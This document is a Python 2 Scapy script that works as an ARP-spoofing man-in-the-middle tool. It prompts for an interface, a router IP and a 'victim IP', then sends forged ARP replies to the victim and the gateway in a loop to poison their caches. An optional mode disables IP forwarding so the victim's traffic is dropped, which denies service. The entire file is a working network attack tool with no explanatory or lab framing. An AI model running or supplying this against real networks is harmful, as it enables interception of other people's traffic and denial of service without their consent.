from scapy.all import *
import sys
import os
import thread
import time


def toggle_ipforwarding(v):
    #os.system("echo %d > /proc/sys/net/ipv4/ip_forward" % v)
    os.system("sudo sysctl -w net.inet.ip.forwarding=%d" % v)

try:
    interface = raw_input ("[*] Enter Interface: ")
    gateIP = raw_input("[*] Enter Router IP: ")
    victimIP = raw_input("[*] Enter victim IP: ")
    DOS = raw_input("[*] Deny service (y/n): ")
except KeyboardInterrupt:
    print "\n[*] User Requested Shutdown"
    print "[*] Exiting..."
    sys.exit(1)

print "\n[*] Enabling IP forwarding...\n"
if(DOS == "y"):
    toggle_ipforwarding(0)
else:
    toggle_ipforwarding(1)

def get_mac(ip):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout = 2,iface = interface,inter = 0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    #print "\n[*] Restoring Targets..."
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 10)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 10)
    #print "[*] Disabling IP Forwarding..."
    toggle_ipforwarding(0)
    #print "[*] Shutting Down..."
    sys.exit(1)

def spoof(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))

def sniffer(threadName, ip):
    time.sleep(2)
    while 1:
        print ip


def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        toggle_ipforwarding(0)
        print "[!] Couldn't Find Victim MAC Address"
        print "[!] Exiting..."
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        toggle_ipforwarding(0)
        print "[!] Couldn't Find Gateway MAC Address"
        print "[!] Exiting..."
        sys.exit(1)

    # try:
    #    thread.start_new_thread( sniffer, ("Thread-sniffer", victimIP) )
    #
    # except:
    #    print "[!] Unable to start sniffer thread"

    print "[*] Poisoning Targets..."
    while 1:
        try:
            spoof(gateMAC, victimMAC)
            time.sleep(2)
        except KeyboardInterrupt:
            reARP()
            break

mitm()
